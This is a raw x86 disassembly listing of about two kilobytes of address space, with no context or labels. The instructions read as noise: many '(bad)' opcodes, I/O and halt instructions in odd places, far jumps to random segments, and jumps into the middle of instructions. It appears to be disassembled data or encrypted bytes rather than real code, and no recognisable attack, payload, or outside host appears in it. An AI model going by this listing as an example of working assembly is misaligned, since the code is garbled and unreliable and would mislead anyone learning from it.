  4224fa:	mov    ds:0xb11f6ad3,eax
  4224ff:	lods   al,BYTE PTR ds:[esi]
  422500:	out    dx,eax
  422501:	lahf   
  422502:	and    al,0xbb
  422504:	(bad)
  422508:	mov    eax,0x63f6e26f
  42250d:	or     esp,edx
  42250f:	dec    esp
  422510:	or     eax,0x80c7774c
  422515:	(bad)  
  422516:	lock dec ebp
  422518:	sub    BYTE PTR [esi],dh
  42251a:	inc    esp
  42251b:	add    eax,0xe62f5818
  422520:	aad    0x69
  422522:	inc    ebx
  422523:	pushf  
  422524:	mov    di,0x9190
  422528:	push   cs
  422529:	pop    edx
  42252a:	add    DWORD PTR [ebx+0x24d98c3e],edx
  422530:	inc    edi
  422531:	mov    bh,BYTE PTR [edx]
  422533:	jp     0x4224c9
  422535:	or     eax,0x2b3743a5
  42253a:	mov    cl,0x3
  42253c:	jecxz  0x422574
  42253e:	dec    esp
  42253f:	stc    
  422540:	ss in  eax,dx
  422542:	test   eax,0x455133e9
  422547:	dec    ebp
  422548:	les    ebx,FWORD PTR [edx-0x53]
  42254b:	sbb    BYTE PTR [esp+eax*1+0x597b9be5],ch
  422552:	into   
  422553:	mov    eax,ds:0xe438e1df
  422558:	push   0x9c9f4256
  42255d:	mov    bh,0xe0
  42255f:	mov    fs,WORD PTR [ecx+ecx*2-0x718b927b]
  422566:	dec    esi
  422567:	sbb    al,0xa2
  422569:	xlat   BYTE PTR ds:[ebx]
  42256a:	int    0xbd
  42256c:	adc    eax,0x5a6bcf43
  422571:	call   0xa434c831
  422576:	sar    DWORD PTR [esi-0x3f2353de],cl
  42257c:	fdiv   DWORD PTR [ecx+0x7e0c1d58]
  422582:	hlt    
  422583:	add    eax,0xe679ac32
  422588:	mov    ds:0xea71926d,eax
  42258d:	comiss xmm0,xmm6
  422590:	arpl   sp,ax
  422592:	lahf   
  422593:	test   eax,0x169a1363
  422598:	xchg   edi,eax
  422599:	push   edi
  42259a:	sbb    DWORD PTR [edx-0x3db1f20c],esi
  4225a0:	test   al,0xf1
  4225a2:	(bad)  
  4225a3:	mov    ch,0xef
  4225a5:	dec    edx
  4225a6:	hlt    
  4225a7:	ss dec edx
  4225a9:	cmp    eax,0xcadf89a3
  4225ae:	ins    BYTE PTR es:[edi],dx
  4225af:	repz or DWORD PTR [edi],0xcebd6d2e
  4225b6:	push   esp
  4225b7:	enter  0xd5c9,0xa1
  4225bb:	sub    bh,BYTE PTR [ebp-0x3d]
  4225be:	nop
  4225bf:	bound  ebx,QWORD PTR [edi-0x4b]
  4225c2:	icebp  
  4225c3:	ja     0x422583
  4225c5:	fcomp  QWORD PTR [edx-0x42e5adbf]
  4225cb:	lods   eax,DWORD PTR ds:[esi]
  4225cc:	adc    DWORD PTR [edx],edi
  4225ce:	cmp    cl,BYTE PTR [ebx-0x67f19482]
  4225d4:	xchg   esi,eax
  4225d5:	scas   al,BYTE PTR es:[edi]
  4225d6:	xchg   esi,eax
  4225d7:	int    0x8c
  4225d9:	mov    dl,0x99
  4225db:	sbb    DWORD PTR [eax+0x53],eax
  4225de:	push   es
  4225df:	clc    
  4225e0:	jbe    0x42259c
  4225e2:	pop    ecx
  4225e3:	int    0x36
  4225e5:	mov    bh,0x89
  4225e7:	jne    0x422582
  4225e9:	sar    DWORD PTR [edi+0x67],cl
  4225ec:	push   ss
  4225ed:	aaa    
  4225ee:	rol    esp,1
  4225f0:	cmp    al,0xe6
  4225f2:	mov    cl,0xa3
  4225f4:	jno    0x422582
  4225f6:	sbb    esp,DWORD PTR [edx+0x6a5607c4]
  4225fc:	fsubr  DWORD PTR [esi]
  4225fe:	popa   
  4225ff:	push   ebp
  422600:	lods   eax,DWORD PTR ds:[esi]
  422601:	inc    eax
  422602:	mov    esp,0x9a372416
  422607:	inc    eax
  422608:	fisttp QWORD PTR [ebp-0xc]
  42260b:	clc    
  42260c:	xor    DWORD PTR [esi],edi
  42260e:	int    0x9b
  422610:	div    BYTE PTR [eax+ebx*4]
  422613:	gs or  bl,ch
  422616:	loop   0x4225e4
  422618:	fwait
  422619:	cmp    eax,0x8ab76174
  42261e:	pop    ebx
  42261f:	mov    edi,0x24ede869
  422624:	ds xchg cl,dh
  422627:	adc    DWORD PTR [ebp-0x671019ce],ebp
  42262d:	jae    0x422616
  42262f:	enter  0xaa0,0x94
  422633:	jnp    0x422656
  422635:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422636:	adc    DWORD PTR [ecx],ecx
  422638:	mov    ds:0x710def18,al
  42263d:	xchg   ecx,eax
  42263e:	push   ebp
  42263f:	pop    ecx
  422640:	lods   al,BYTE PTR ds:[esi]
  422642:	mov    eax,0x948915a4
  422647:	and    eax,0xeff416e8
  42264c:	or     al,0x48
  42264e:	add    eax,ebp
  422650:	pushf  
  422651:	stos   BYTE PTR es:[edi],al
  422652:	shl    DWORD PTR [ecx-0x65cfe33],0xf1
  422659:	dec    esp
  42265a:	leave  
  42265b:	retf   
  42265c:	imul   esp,DWORD PTR [esi+0x25],0xca672b2e
  422663:	enter  0xdb3c,0xea
  422667:	jg     0x42262e
  422669:	sbb    cl,BYTE PTR [esi]
  42266b:	je     0x42263a
  42266d:	jnp    0x422662
  42266f:	or     BYTE PTR [edi+0x34],dl
  422672:	pop    edx
  422673:	mov    ds:0xd308ba7b,al
  422678:	inc    edi
  422679:	or     cl,BYTE PTR ds:0x46d26241
  42267f:	xchg   ebp,eax
  422680:	(bad)  
  422682:	jno    0x42266f
  422684:	das    
  422685:	mov    cl,0xfc
  422687:	aas    
  422688:	rol    eax,cl
  42268a:	jnp    0x4226e5
  42268c:	mov    dl,0xb8
  42268e:	push   es
  42268f:	pushf  
  422690:	push   ebx
  422691:	in     al,0xf4
  422693:	sub    al,0x83
  422695:	pop    edx
  422696:	mov    cl,0x4c
  422698:	repz adc DWORD PTR [edx+0xd810274],esi
  42269f:	data16 ja 0x422712
  4226a2:	cmp    BYTE PTR [ebx],dl
  4226a4:	sub    DWORD PTR [edx+0x11],edi
  4226a7:	imul   edi,ecx,0x74
  4226aa:	bound  ebp,QWORD PTR [eax-0x3f]
  4226ad:	adc    al,0x9b
  4226af:	cmp    ah,BYTE PTR [eax-0x75]
  4226b2:	pop    ebx
  4226b3:	adc    DWORD PTR [ebx],esi
  4226b5:	imul   edi,ebx,0xffffffef
  4226b8:	pop    edx
  4226b9:	xchg   esi,eax
  4226ba:	bound  ecx,QWORD PTR [edx+ebx*8+0x77d58fd7]
  4226c1:	imul   ebx,ebp,0xffffffdb
  4226c4:	pop    ecx
  4226c5:	add    eax,0x8ec9df0e
  4226ca:	(bad)
  4226ce:	rol    DWORD PTR [eax+0x3],1
  4226d1:	(bad)  [ebp-0x3b]
  4226d4:	dec    edi
  4226d5:	sub    DWORD PTR [ebx+0x5f05ad3d],eax
  4226db:	mov    DWORD PTR gs:[edi],ecx
  4226de:	loop   0x422722
  4226e0:	jmp    0xf0af:0x23fe7979
  4226e7:	es jb  0x422701
  4226ea:	xchg   BYTE PTR [ebx],al
  4226ec:	pop    esp
  4226ed:	sbb    cl,BYTE PTR [edx]
  4226ef:	loopne 0x4226b7
  4226f1:	lahf   
  4226f2:	mov    ?,WORD PTR [esi+ebx*8]
  4226f5:	mov    edx,0x75c7218e
  4226fa:	pop    es
  4226fb:	retf   0x3a70
  4226fe:	mov    eax,0x442475cb
  422703:	enter  0xa04c,0x28
  422707:	xchg   ecx,eax
  422708:	sbb    esi,edx
  42270a:	sbb    al,0x90
  42270c:	(bad)
  42270f:	sub    al,0x3d
  422711:	dec    esi
  422712:	xor    al,0x75
  422714:	inc    edx
  422715:	dec    edi
  422716:	push   esi
  422717:	cmp    eax,0x43759630
  42271c:	sbb    dl,cl
  42271e:	(bad)  
  42271f:	push   0x44
  422721:	mov    bl,0x8d
  422723:	cmp    esi,DWORD PTR [eax+0x4343030c]
  422729:	sbb    eax,0x19c13dfb
  42272e:	(bad)  
  42272f:	mov    ebp,0x7146b815
  422734:	(bad)  
  422735:	(bad)  
  422736:	repz sbb bh,BYTE PTR ds:0xd588ddf4
  42273d:	out    0xf0,eax
  42273f:	dec    esi
  422740:	xchg   ebx,eax
  422741:	xlat   BYTE PTR ds:[ebx]
  422742:	test   al,0x6f
  422744:	daa    
  422745:	mov    ebx,0x9c0b05e5
  42274a:	call   0x41118474
  42274f:	push   ebp
  422750:	sub    BYTE PTR [edx],cl
  422752:	mov    ebp,0xcfbc9af4
  422757:	sbb    eax,0x500f5cab
  42275c:	or     ebx,DWORD PTR [esi]
  42275e:	jl     0x422708
  422760:	jae    0x4227dc
  422762:	shl    BYTE PTR fs:[ebx+0x53ca1a38],0xe0
  42276a:	dec    ecx
  42276b:	mov    BYTE PTR [edx],dl
  42276d:	sbb    ebx,DWORD PTR [ebp+edi*1-0x69]
  422771:	(bad)  
  422772:	mov    dh,0x30
  422774:	(bad)  
  422775:	js     0x42276b
  422777:	mov    ecx,DWORD PTR [edx]
  422779:	pusha  
  42277a:	jecxz  0x42276e
  42277c:	ret    0x92c9
  42277f:	jg     0x4227e1
  422781:	xchg   edi,eax
  422782:	inc    esp
  422783:	pop    edx
  422784:	jae    0x42272c
  422786:	arpl   WORD PTR [ebx+esi*1-0x336e5933],cx
  42278d:	mov    bl,0xb6
  42278f:	ds jle 0x4227cb
  422792:	mov    dh,0x61
  422794:	or     BYTE PTR [ecx+0x4fb67f3e],bh
  42279a:	mov    bl,0xe8
  42279c:	mov    ecx,0xefbef5ed
  4227a1:	outs   dx,DWORD PTR ds:[esi]
  4227a2:	xchg   DWORD PTR [ecx],ebx
  4227a4:	jns    0x422758
  4227a6:	adc    BYTE PTR [edx+0x3c],bl
  4227a9:	lods   eax,DWORD PTR ds:[esi]
  4227aa:	jmp    0x4227ec
  4227ac:	push   edi
  4227ad:	fidiv  WORD PTR [ebx+0x27a68004]
  4227b3:	xor    al,0xcb
  4227b5:	or     al,0x39
  4227b7:	popa   
  4227b8:	lock push esp
  4227ba:	out    0x6e,al
  4227bc:	popf   
  4227bd:	push   edx
  4227be:	in     eax,0x23
  4227c0:	les    esp,FWORD PTR ds:0x2939c191
  4227c6:	jo     0x422770
  4227c8:	mov    ebx,0x5bb2e359
  4227cd:	sbb    esp,DWORD PTR [ecx]
  4227cf:	and    al,0xc5
  4227d1:	inc    ebp
  4227d2:	adc    al,0xdb
  4227d4:	fs push ebx
  4227d6:	mov    dh,0x2a
  4227d8:	pop    esi
  4227d9:	cmp    ecx,DWORD PTR [ecx+0x32af03e9]
  4227df:	int3   
  4227e0:	mov    ds:0xf9ba428c,al
  4227e5:	popf   
  4227e6:	clc    
  4227e7:	ret    0xd100
  4227ea:	dec    esp
  4227eb:	adc    edx,DWORD PTR [esi-0x17bdae3a]
  4227f1:	sar    DWORD PTR [edi],0xb0
  4227f4:	aas    
  4227f5:	outs   dx,DWORD PTR ds:[esi]
  4227f6:	into   
  4227f7:	repnz sbb BYTE PTR ds:[esi-0x1dae68b5],cl
  4227ff:	mov    al,ds:0x66fd8c1b
  422804:	aad    0x7d
  422806:	iret   
  422807:	push   0x4c
  422809:	pop    esp
  42280a:	pop    esi
  42280b:	cwde   
  42280c:	fisub  WORD PTR [esi]
  42280e:	and    DWORD PTR [edi+0x273fbf44],esp
  422814:	adc    DWORD PTR [esi+0x7f4ddc32],eax
  42281a:	scas   al,BYTE PTR es:[edi]
  42281b:	mov    dh,0x15
  42281d:	aas    
  42281e:	fstp   DWORD PTR [edi-0x33e31a03]
  422824:	(bad)  
  422825:	jle    0x422873
  422827:	xchg   ebx,eax
  422828:	pop    edi
  422829:	daa    
  42282a:	xor    eax,DWORD PTR [esi-0x77]
  42282d:	test   esi,ebp
  42282f:	sub    DWORD PTR [ecx],0xffffff85
  422832:	nop
  422833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422834:	daa    
  422835:	enter  0xe00b,0x9c
  422839:	call   0xf8bab84f
  42283e:	pop    eax
  42283f:	jno    0x422813
  422841:	(bad)  
  422842:	mov    cl,BYTE PTR [eax]
  422844:	jb     0x422801
  422846:	inc    ebp
  422847:	outs   dx,BYTE PTR ds:[esi]
  422848:	cmc    
  422849:	mov    BYTE PTR [eax+0xd01cdbc],bh
  42284f:	and    bp,sp
  422852:	bound  edx,QWORD PTR [ebx]
  422854:	lods   al,BYTE PTR ds:[esi]
  422855:	mov    bl,0xbb
  422857:	add    eax,0xa6576f11
  42285c:	mov    cl,0xea
  42285e:	ins    BYTE PTR es:[edi],dx
  42285f:	lock sub eax,ebp
  422862:	adc    al,0x0
  422864:	test   eax,0xfcdb1547
  422869:	mov    edi,0xb048e2e3
  42286e:	iret   
  42286f:	mov    ss,edx
  422871:	mov    ch,0xca
  422873:	xor    cl,BYTE PTR [ebp-0x69]
  422876:	and    ecx,esi
  422878:	aam    0x18
  42287a:	stos   BYTE PTR es:[edi],al
  42287b:	or     ecx,DWORD PTR [ebx]
  42287d:	pop    ebp
  42287e:	mov    bl,0xa0
  422880:	daa    
  422881:	jb     0x4228de
  422883:	sub    eax,0xeaee402f
  422888:	jg     0x4228f1
  42288a:	mov    bh,0x62
  42288c:	jae    0x422884
  42288e:	lods   al,BYTE PTR ds:[esi]
  42288f:	adc    al,0x69
  422891:	out    dx,eax
  422892:	pop    ds
  422893:	fs out 0x8a,eax
  422896:	mov    ch,cl
  422898:	and    ebp,DWORD PTR [eax+0x10a6c376]
  42289e:	jmp    0x4228d9
  4228a0:	nop
  4228a1:	rol    BYTE PTR [ecx+0x4e],1
  4228a4:	xchg   esp,eax
  4228a5:	lds    eax,FWORD PTR [edi-0x5dd9fca6]
  4228ab:	test   edi,ebp
  4228ad:	dec    ecx
  4228ae:	out    dx,eax
  4228af:	xchg   ebp,eax
  4228b0:	out    0xfb,eax
  4228b2:	(bad)  
  4228b3:	and    al,0xf4
  4228b5:	aam    0x7e
  4228b7:	mov    edx,DWORD PTR [esp+ebx*1+0x69]
  4228bb:	push   0x7714e2e2
  4228c0:	fisubr DWORD PTR [ecx+edx*1-0x5e20429f]
  4228c7:	aaa    
  4228c8:	fs (bad) 
  4228ca:	mov    al,0x87
  4228cc:	sub    al,BYTE PTR [esi+ebp*4+0x105de457]
  4228d3:	push   0xc3cebcf3
  4228d8:	pop    es
  4228d9:	stos   DWORD PTR es:[edi],eax
  4228da:	lds    edi,FWORD PTR [ebp-0x3]
  4228dd:	xor    al,0x8e
  4228df:	mov    edi,DWORD PTR [edx+0x3bddcad4]
  4228e5:	add    eax,0xfd965144
  4228ea:	and    BYTE PTR [ebp+ebp*4-0x65],al
  4228ee:	add    eax,0x250d368
  4228f3:	adc    eax,DWORD PTR [ebx-0xc]
  4228f6:	pop    esi
  4228f7:	xor    esp,ebp
  4228f9:	xor    eax,DWORD PTR [ecx]
  4228fb:	je     0x4228c9
  4228fd:	mov    edx,0xc1c8f5f0
  422902:	sub    BYTE PTR [esp+eiz*8-0x6ddb1fb7],0xb7
  42290a:	adc    BYTE PTR [edx+ecx*1],bl
  42290d:	mov    BYTE PTR gs:[eax+0x77],bl
  422911:	sahf   
  422912:	mov    bl,0x1d
  422914:	sub    eax,DWORD PTR [edx]
  422916:	mov    bh,0x72
  422918:	fwait
  422919:	pop    edi
  42291a:	push   0xffffffb5
  42291c:	retf   0x40f3
  42291f:	xor    eax,0xbb125522
  422924:	sbb    bl,BYTE PTR [ebp+0x40]
  422927:	hlt    
  422928:	loopne 0x4229a3
  42292a:	sahf   
  42292b:	push   ds
  42292c:	bound  esp,QWORD PTR [ebx+0x128ffe92]
  422932:	sti    
  422933:	jle    0x42298c
  422935:	and    ecx,DWORD PTR [esp+esi*8]
  422938:	imul   esp,edx,0x276e8c93
  42293e:	test   al,0xa4
  422940:	(bad)  
  422941:	xor    edi,DWORD PTR [esi]
  422943:	pop    es
  422944:	mov    esp,esi
  422946:	aam    0x1f
  422948:	xchg   ebp,eax
  422949:	add    BYTE PTR [eax],ch
  42294b:	adc    eax,0x1c911de5
  422950:	add    al,0x19
  422952:	aad    0xf9
  422954:	(bad)  
  422955:	gs test eax,0x6426ab3c
  42295b:	mov    edx,0x3951e774
  422960:	outs   dx,DWORD PTR ds:[esi]
  422961:	aaa    
  422962:	nop
  422963:	mov    eax,ds:0x87d1be1d
  422968:	rcr    BYTE PTR [esi+eax*8-0x31],cl
  42296c:	mov    ch,0x6b
  42296e:	and    al,0x8d
  422970:	jae    0x422968
  422972:	stos   BYTE PTR es:[edi],al
  422973:	inc    edi
  422974:	out    dx,al
  422975:	fwait
  422976:	scas   eax,DWORD PTR es:[edi]
  422977:	and    edx,ebp
  422979:	sub    al,0xa9
  42297b:	jmp    0x8103:0xbe7fa7b
  422982:	inc    edi
  422983:	ret    0x8b0a
  422986:	push   esi
  422987:	adc    cl,BYTE PTR [edi+ebp*2+0x208b3beb]
  42298e:	popa   
  42298f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422990:	mov    BYTE PTR [ebx+0x3b],cl
  422993:	aaa    
  422994:	dec    edi
  422995:	ret    0xc139
  422998:	(bad)  
  422999:	stos   BYTE PTR es:[edi],al
  42299a:	mov    edi,0x623b61b6
  42299f:	inc    esi
  4229a0:	sbb    al,0x16
  4229a2:	dec    edx
  4229a3:	and    BYTE PTR ds:0xf78e00e9,bh
  4229a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229aa:	jne    0x422a03
  4229ac:	and    DWORD PTR [esi-0x16c42508],ebp
  4229b2:	pop    esi
  4229b3:	popa   
  4229b4:	pop    ebp
  4229b5:	cli    
  4229b6:	jbe    0x4229c6
  4229b8:	pop    eax
  4229b9:	rol    bl,0xdb
  4229bc:	mov    ebx,0x92c4e917
  4229c1:	je     0x4229ba
  4229c3:	pop    esp
  4229c4:	mov    ebp,eax
  4229c6:	push   edi
  4229c7:	or     al,0xcb
  4229c9:	add    al,0x3a
  4229cb:	inc    esi
  4229cc:	shl    ebx,1
  4229ce:	push   edx
  4229cf:	jmp    0xab29:0x5e8b2acb
  4229d6:	xor    ah,dh
  4229d8:	inc    ebp
  4229d9:	mov    BYTE PTR [eax+0x5af0650f],al
  4229df:	int    0x1c
  4229e1:	in     eax,0x46
  4229e3:	(bad)  
  4229e4:	xchg   ebp,eax
  4229e5:	adc    edx,DWORD PTR [esi-0x472debad]
  4229eb:	add    eax,0x6d7a20fe
  4229f0:	sbb    eax,0x96e63ecc
  4229f5:	xor    eax,0x81fe6c59
  4229fa:	popf   
  4229fb:	add    BYTE PTR [ebx-0x55],ch
  4229fe:	or     eax,0x122a3450
  422a03:	stos   DWORD PTR es:[edi],eax
  422a04:	mov    dh,0x3c
  422a06:	jb     0x4229ac
  422a08:	test   BYTE PTR [ebx+0x7c11cb86],cl
  422a0e:	jecxz  0x422a45
  422a10:	xchg   ebx,eax
  422a11:	dec    ebx
  422a12:	fnstcw WORD PTR [edi+0x36263bfa]
  422a18:	retf   0x53bf
  422a1b:	inc    esp
  422a1c:	xor    eax,0x57dbf16d
  422a21:	adc    al,0xb1
  422a23:	inc    ebx
  422a24:	mov    BYTE PTR [ebx+eax*1+0xb],bl
  422a28:	cmp    eax,0x6a329a6f
  422a2d:	int    0x12
  422a2f:	das    
  422a30:	jg     0x422aa6
  422a32:	iret   
  422a33:	mov    esi,0x7bf35ac5
  422a38:	(bad)  
  422a39:	fucomi st,st(7)
  422a3b:	dec    ebp
  422a3c:	js     0x422a11
  422a3e:	and    BYTE PTR [ebp+0x6fd0ebd9],cl
  422a44:	jo     0x422a67
  422a46:	add    eax,0xd1c705f3
  422a4b:	hlt    
  422a4c:	icebp  
  422a4d:	test   al,0xc1
  422a4f:	mov    BYTE PTR [edx+0x1e6bccff],dl
  422a55:	jmp    0xdb3a074b
  422a5a:	shl    eax,cl
  422a5c:	push   eax
  422a5d:	push   cs
  422a5e:	stc    
  422a5f:	mov    edx,0xc2bff8a8
  422a64:	out    0xab,al
  422a66:	in     eax,dx
  422a67:	cwde   
  422a68:	(bad)  
  422a69:	xor    DWORD PTR [eax],esi
  422a6b:	jo     0x422ac9
  422a6d:	dec    edi
  422a6e:	sahf   
  422a6f:	mov    WORD PTR [esi],ss
  422a71:	add    ebx,DWORD PTR [edi-0x54]
  422a74:	stc    
  422a75:	push   esp
  422a76:	cmp    eax,0x1a306b9a
  422a7b:	pop    edx
  422a7c:	in     al,0xf4
  422a7e:	aam    0x7b
  422a80:	into   
  422a81:	add    esp,esp
  422a83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a84:	shr    BYTE PTR [edi+0x3d],0x6a
  422a88:	push   ecx
  422a89:	mov    eax,edx
  422a8b:	or     DWORD PTR [edx-0x33958540],ecx
  422a91:	dec    esi
  422a92:	sar    DWORD PTR [edi],0x3
  422a95:	sub    BYTE PTR [ebx+0x63],bl
  422a98:	add    eax,0x28ecff2e
  422a9d:	lods   eax,DWORD PTR ds:[esi]
  422a9e:	les    eax,FWORD PTR ds:0x98afd23e
  422aa4:	outs   dx,BYTE PTR ds:[esi]
  422aa5:	aaa    
  422aa6:	mov    cl,BYTE PTR [edi-0x6f]
  422aa9:	pop    edx
  422aaa:	ins    BYTE PTR es:[edi],dx
  422aab:	mov    al,0xe5
  422aad:	test   DWORD PTR [ecx-0x6c7538c5],ebp
  422ab3:	fldcw  WORD PTR [edx-0x65]
  422ab6:	loop   0x422acc
  422ab8:	inc    ebx
  422ab9:	(bad)  
  422aba:	mov    ds:0xa00e862e,al
  422abf:	nop
  422ac0:	test   BYTE PTR [esi+0x65639a04],bh
  422ac6:	cdq    
  422ac7:	cld    
  422ac8:	jecxz  0x422aaf
  422aca:	dec    esi
  422acb:	and    DWORD PTR [ebp+0x37cffbc0],ebp
  422ad1:	mov    esi,DWORD PTR [eax-0x5e]
  422ad4:	adc    eax,0xfebddc8e
  422ad9:	mov    bh,BYTE PTR [esi+0x58]
  422adc:	les    edi,FWORD PTR [edx]
  422ade:	imul   ecx,DWORD PTR [edx+edx*8+0x10919c24],0x4ed0db4f
  422ae9:	cli    
  422aea:	cld    
  422aeb:	add    al,0x66
  422aed:	adc    dl,BYTE PTR [ebx+0x21]
  422af0:	test   al,0xcf
  422af2:	sti    
  422af3:	fistp  DWORD PTR [esi]
  422af5:	in     al,0x94
  422af7:	sub    ch,BYTE PTR [esp+edi*8]
  422afa:	inc    edx
  422afb:	pop    esi
  422afc:	sbb    BYTE PTR [eax-0x603790fb],0xf2
  422b03:	push   esi
  422b04:	(bad)  
  422b05:	dec    edx
  422b06:	adc    ah,BYTE PTR [ebx+0x76cec4f6]
  422b0c:	add    eax,0x2f1870b9
  422b11:	cmp    eax,0x6529f36c
  422b16:	lea    edi,ds:0xccb5cb2b
  422b1c:	call   0xea0e:0xfd100487
  422b23:	pop    ebp
  422b24:	jp     0x422b9c
  422b26:	test   BYTE PTR [ecx-0x35b69e79],dh
  422b2c:	into   
  422b2d:	dec    edx
  422b2e:	popf   
  422b2f:	out    dx,eax
  422b30:	(bad)  
  422b31:	sbb    eax,0x5ad346d0
  422b36:	mov    eax,0xe32203ce
  422b3b:	xor    eax,0x6af4d545
  422b40:	rcl    DWORD PTR [edx],cl
  422b42:	sub    bl,BYTE PTR [ecx+0x77f9dc1f]
  422b48:	dec    ecx
  422b49:	dec    edx
  422b4a:	or     eax,DWORD PTR [edx+edi*8+0x1b]
  422b4e:	push   ds
  422b4f:	dec    esi
  422b50:	fist   WORD PTR [eax+0x4b082052]
  422b56:	loop   0x422b9b
  422b58:	add    al,0xc7
  422b5a:	or     BYTE PTR [esi+0x2d],bh
  422b5d:	xchg   edi,eax
  422b5e:	push   0x56
  422b60:	adc    DWORD PTR [ebp-0x38],0x32337489
  422b67:	push   ebx
  422b68:	sbb    eax,0x1b0feeaf
  422b6d:	or     ebp,ebp
  422b6f:	mul    edi
  422b71:	std    
  422b72:	adc    al,0xd6
  422b74:	and    al,0x9b
  422b76:	ficom  WORD PTR [esi+edi*8-0x59d00dd7]
  422b7d:	mov    cl,0x5e
  422b7f:	xchg   esi,eax
  422b80:	data16 sahf 
  422b82:	fnstenv [eax-0x6]
  422b85:	int    0x8c
  422b87:	aad    0xb0
  422b89:	test   bl,dl
  422b8b:	pop    ds
  422b8c:	adc    esi,ecx
  422b8e:	sbb    DWORD PTR [ebp+0x44],0xb1e09b52
  422b95:	push   ebp
  422b96:	and    ebp,DWORD PTR [ebp*4-0x6d4b295a]
  422b9d:	push   ebx
  422b9e:	cmp    BYTE PTR [edx],bl
  422ba0:	out    dx,eax
  422ba1:	xchg   esp,eax
  422ba2:	outs   dx,DWORD PTR ds:[esi]
  422ba3:	jno    0x422b2a
  422ba5:	xor    ecx,DWORD PTR [esi+eiz*1]
  422ba8:	daa    
  422ba9:	jmp    0xedd663eb
  422bae:	lods   eax,DWORD PTR ds:[esi]
  422baf:	fwait
  422bb0:	add    BYTE PTR [esi],bl
  422bb2:	push   edi
  422bb3:	mov    ds:0x47c12f20,al
  422bb8:	add    eax,0x803a7ef5
  422bbd:	call   DWORD PTR [ebx]
  422bbf:	ret    
  422bc0:	push   edx
  422bc1:	in     eax,dx
  422bc2:	inc    ecx
  422bc3:	dec    eax
  422bc4:	inc    esi
  422bc5:	lock sub eax,0x231118a7
  422bcb:	jo     0x422c21
  422bcd:	aaa    
  422bce:	stos   DWORD PTR es:[edi],eax
  422bcf:	mov    esp,esp
  422bd1:	pop    es
  422bd2:	pop    es
  422bd3:	and    BYTE PTR [esi-0x32],cl
  422bd6:	ins    DWORD PTR es:[edi],dx
  422bd7:	mov    DWORD PTR [ecx+0x4f31eef3],ecx
  422bdd:	sub    esi,DWORD PTR [ecx+eiz*4]
  422be0:	pop    ecx
  422be1:	pushf  
  422be2:	and    ebx,eax
  422be4:	dec    edi
  422be5:	push   es
  422be6:	mov    esi,0xd13898dd
  422beb:	jmp    0x422c3f
  422bed:	les    esi,FWORD PTR [ebx+0x57]
  422bf0:	inc    edx
  422bf1:	out    dx,eax
  422bf2:	stos   BYTE PTR es:[edi],al
  422bf3:	bound  esp,QWORD PTR ds:0xd2e7a967
  422bf9:	pop    eax
  422bfa:	fmul   DWORD PTR [esi+0x32]
  422bfd:	mov    bl,0xaf
  422bff:	sbb    BYTE PTR [ebp+0x7a],cl
  422c02:	pusha  
  422c03:	out    dx,eax
  422c04:	jae    0x422ba2
  422c06:	rcr    BYTE PTR [ebx-0x2d],cl
  422c09:	test   edx,edi
  422c0b:	in     al,0x2
  422c0d:	push   ebp
  422c0e:	xchg   esi,eax
  422c0f:	sub    dl,BYTE PTR [edx+0x66]
  422c12:	cdq    
  422c13:	adc    eax,0xb18fe7a3
  422c19:	or     BYTE PTR [esi-0x30f6078b],0x54
  422c20:	jae    0x422c74
  422c22:	fmulp  st(1),st
  422c24:	jo     0x422bdf
  422c26:	dec    eax
  422c27:	jmp    0xea56:0x7fe54e22
  422c2e:	dec    ebp
  422c2f:	add    dh,BYTE PTR [edi-0x6b]
  422c32:	mov    eax,ds:0xb015c455
  422c37:	fmul   QWORD PTR [ecx+ebp*1]
  422c3a:	inc    ebp
  422c3b:	dec    eax
  422c3c:	loop   0x422c07
  422c3e:	fcomp  DWORD PTR [edx+0x22]
  422c41:	mov    ah,0x8d
  422c43:	mov    edx,0xead2a361
  422c48:	xchg   ecx,eax
  422c49:	cmp    eax,DWORD PTR [ebp-0x22]
  422c4c:	gs leave 
  422c4e:	loop   0x422c7f
  422c50:	outs   dx,DWORD PTR ds:[esi]
  422c51:	adc    bh,bl
  422c53:	sub    BYTE PTR [edi],al
  422c55:	mov    bh,0x34
  422c57:	dec    eax
  422c58:	pop    es
  422c59:	loopne 0x422c3e
  422c5b:	sbb    al,0xb8
  422c5d:	in     eax,dx
  422c5e:	fwait
  422c5f:	and    DWORD PTR [esi],ebp
  422c61:	push   ebx
  422c62:	jmp    0x8abc:0xac14e539
  422c69:	mov    ebp,0xe1af2f14
  422c6e:	in     al,0x37
  422c70:	outs   dx,DWORD PTR ds:[esi]
  422c71:	push   ebx
  422c72:	mov    ah,0x39
  422c74:	cmc    
  422c75:	mov    edi,0x21982e79
  422c7a:	mov    al,ch
  422c7c:	icebp  
  422c7d:	adc    ch,cl
  422c7f:	or     al,0xb6
  422c81:	scas   al,BYTE PTR es:[edi]
  422c82:	inc    eax
  422c83:	pop    ds
  422c84:	fsubr  st,st(3)
  422c86:	test   esi,ecx
  422c88:	mov    al,0x20
  422c8a:	(bad)  
  422c8b:	fldcw  WORD PTR [ebx-0x6c]
  422c8e:	mov    ?,WORD PTR ds:[esi-0x64]
  422c92:	dec    ebx
  422c93:	cmp    DWORD PTR [edx+esi*8],esi
  422c96:	clc    
  422c97:	js     0x422c28
  422c99:	mov    edi,0xc2d52a08
  422c9e:	leave  
  422c9f:	dec    ecx
  422ca0:	push   es
  422ca1:	inc    eax
  422ca2:	inc    edi
  422ca3:	loopne 0x422cf4
  422ca5:	sti    
  422ca6:	mov    al,0xe
  422ca8:	mov    edx,0x317ffd2d
  422cad:	sub    eax,0x56a1c954
  422cb2:	mov    bl,0x3
  422cb4:	in     eax,dx
  422cb5:	push   es
  422cb6:	sub    dh,0x96
  422cb9:	sbb    eax,0x171f3ee3
  422cbe:	stos   BYTE PTR es:[edi],al
  422cbf:	xchg   ebx,eax
  422cc0:	cld    
  422cc1:	out    dx,eax
  422cc2:	sahf   
  422cc3:	es mov ebx,0x19f89fd9
  422cc9:	ja     0x422d2e
  422ccb:	push   es
  422ccc:	mov    dl,0xcd
  422cce:	les    edx,FWORD PTR [eax+0x2987fecc]
  422cd4:	pop    ebx
  422cd5:	push   ecx
  422cd6:	dec    ebx
  422cd7:	adc    eax,0xe1a7a06e
  422cdc:	retf   0x8a37
  422cdf:	dec    ebx
  422ce0:	(bad)  
  422ce1:	mov    edi,0x38013bb2
